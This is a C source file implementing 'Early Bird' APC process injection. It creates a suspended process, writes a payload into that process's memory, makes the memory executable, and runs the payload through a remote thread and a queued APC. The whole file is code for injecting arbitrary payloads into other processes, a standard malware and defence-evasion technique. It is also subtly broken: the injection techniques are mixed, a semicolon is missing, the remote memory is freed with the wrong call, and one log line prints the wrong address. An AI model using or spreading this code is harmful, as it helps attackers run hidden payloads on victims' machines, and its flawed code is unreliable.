#include "EarlyBirdApcInjection.h"

BOOL CreateSuspendedProcess
(
	_In_ LPCWSTR TargetProcessPath,
	_Out_ HANDLE* ProcessHandle,
	_Out_ HANDLE* ThreadHandle,
	_Out_ DWORD* ThreadId
)
{

	STARTUPINFOW		si			= { 0 };
	PROCESS_INFORMATION pi			= { 0 };

	RtlSecureZeroMemory(&si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFOW);

	if (!CreateProcessW(TargetProcessPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		WARN("Failed To Create Process: %ls", TargetProcessPath);
		PRINT_ERROR("CreateProcessW");
		return FALSE; // no point of continuing if we can't even create the process
	}

	INFO("[0x%p] Process Handle", pi.hProcess);
	INFO("\t\t\t\\___ [%ld] ProcessId", pi.dwProcessId);
	INFO("[0x%p] Thread Handle", pi.hThread);
	INFO("\t\t\t\\___ [%ld] ThreadId", pi.dwThreadId);

	*ProcessHandle = pi.hProcess;
	*ThreadHandle = pi.hThread;
	*ThreadId = pi.dwThreadId;

	return TRUE;

}

BOOL WritePayloadViaEarlyBirdInjection
(
	_In_ HANDLE ProcessHandle,
	_In_ HANDLE ThreadHandle,
	_In_ DWORD ThreadId,
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize
)
{

	BOOL		State			= TRUE;
	PVOID		PayloadBuffer	= NULL;
	DWORD		dwOldProtection = 0;
	SIZE_T		BytesWritten	= 0;

	if (!(PayloadBuffer = VirtualAllocEx(ProcessHandle, NULL, PayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)) || PayloadBuffer == NULL)
	{
		WARN("Failed To Allocate %zu Bytes to Payload Buffer!", PayloadSize);
		PRINT_ERROR("VirtualAllocEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Successfully Allocated %zu Bytes To Target Process!", PayloadSize);
	INFO("[0x%p] Payload Buffer", PayloadBuffer);

	if (!WriteProcessMemory(ProcessHandle, PayloadBuffer, Payload, PayloadSize, &BytesWritten) || BytesWritten != PayloadSize)
	{
		WARN("Failed To Write %zu Bytes to Target Process!", PayloadSize);
		PRINT_ERROR("WriteProcessMemory");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Successfully Wrote %zu Bytes to Target Process!", PayloadSize);
	INFO("Wrote Payload @ --> [0x%p]", Payload);

	if (!VirtualProtectEx(ProcessHandle, PayloadBuffer, PayloadSize, PAGE_EXECUTE_READ, &dwOldProtection))
	{
		WARN("Failed To Change Memory Protections!");
		PRINT_ERROR("VirtualProtectEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Memory Protections Changed! PAGE_READWRITE --> PAGE_EXECUTE_READ");

	if (!(ThreadHandle = CreateRemoteThreadEx(ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)PayloadBuffer, NULL, 0, NULL, &ThreadId)) || ThreadHandle == NULL)
	{
		WARN("Failed To Create a new Thread Pointing to Our Payload!");
		PRINT_ERROR("CreateRemoteThreadEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Created New Thread Pointing to Our Payload --> [0x%p]", ThreadHandle, PayloadBuffer);
	
	if (!QueueUserAPC((PAPCFUNC)PayloadBuffer, ThreadHandle, 0))
	{
		WARN("Failed To Queue Asynchronous Procedure Call!");
		PRINT_ERROR("QueueUserAPC");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Waiting For Thread to Finish Executing...");

	ResumeThread(ThreadHandle);

	WaitForSingleObject(ThreadHandle, INFINITE);

	OKAY("DONE!");

_END_FUNC:

	if (ProcessHandle != NULL)
		CloseHandle(ProcessHandle);

	if (ThreadHandle != NULL)
		CloseHandle(ThreadHandle)

	if (PayloadBuffer)
		VirtualFree(PayloadBuffer, 0, MEM_RELEASE);

	return State;

}